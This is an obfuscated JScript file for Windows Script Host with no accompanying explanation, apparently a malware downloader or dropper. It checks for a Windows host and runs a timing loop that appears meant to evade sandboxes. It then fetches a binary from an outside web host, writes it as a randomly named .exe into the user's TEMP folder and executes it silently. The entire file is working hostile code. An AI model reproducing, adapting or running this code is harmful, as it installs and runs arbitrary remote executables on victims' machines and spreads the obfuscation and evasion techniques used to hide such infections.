var VJ = false;
var U0 = "Create"+"Object";
var LD = function U() {return WScript[U0]("WScript"+".Shell");}(), QP = 11;
var RO = "MSXML2"+".XMLHTTP";
var RF = 2;
var GI = RF - 2;
function N(WC){LD["Run"](WC, GI, GI);};
function J(){return RO + "";};
function VA(YD, UV){GI = GI * 1; return YD - UV;};
function VT(){return U0;};
/*@cc_on
  @if (@_win32 || @_win64)
    VJ = true;
  @end
@*/
if (VJ)
{
var NY = "";
function JT(){return 22;};
var RS = 0; var QN = 0;
function RQ()
{
var B = new this["Date"]();
var A0 = B["getUTCMilliseconds"]();
WScript["Sleep"](JT());
var B = new this["Date"]();
var N0 = B["getUTCMilliseconds"]();
WScript["Sleep"](JT());
var B = new this["Date"]();
var A = B["getUTCMilliseconds"]();
var RS = "J0";
RS = VA(N0, A0);
var QN = "H";
QN = VA(A, N0);
NY = "open";
return VA(RS, QN);
}
var IB = false;
var AI = false;
for (var LV = GI; LV < JT() * 1; LV++){if (RQ() != GI){
IB = true; 
QN = "31" + 11 * RS + QN; 
AI = true; 
break;
}}
function X() {return ((IB == true) && (IB == AI)) ? 1 : GI;};
if (IB && X() && AI){
function C() {return LD["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "8kK4wlHvJWf1.ex" + "e";};
 N1 = J();
 K = WScript[U0](N1);
 var LX = 1;
do { 
	for (;LX;){
	try {
		if (LX == 1)
		{
			K[NY]("GET", "http://vidamparty.hu/as0ldr", false);
			K["send"]();
			TF = "Sleep";
			LX = 2;
		}
		WScript[TF](JT() + 120); 
		if (K["readystate"] < 2 * 2) continue;
		LX = GI;
		function W(BD) {var Y = (1, 2, 3, 4, 5, BD); return Y;};
		FQ = WScript[VT()]("ADODB.Stream");
		N1 = FQ;
		N1[NY]();
		N1["type"] = W(1);
		N1["write"](K["ResponseBody"]);
		FQ["position"] = W(GI);
		N1["Save" + "ToFile"](C(), 2);
		FQ["cl"+"ose"]();
		O = C();
		N(O);
	} catch(GC){};};
}while (LX);
}
}

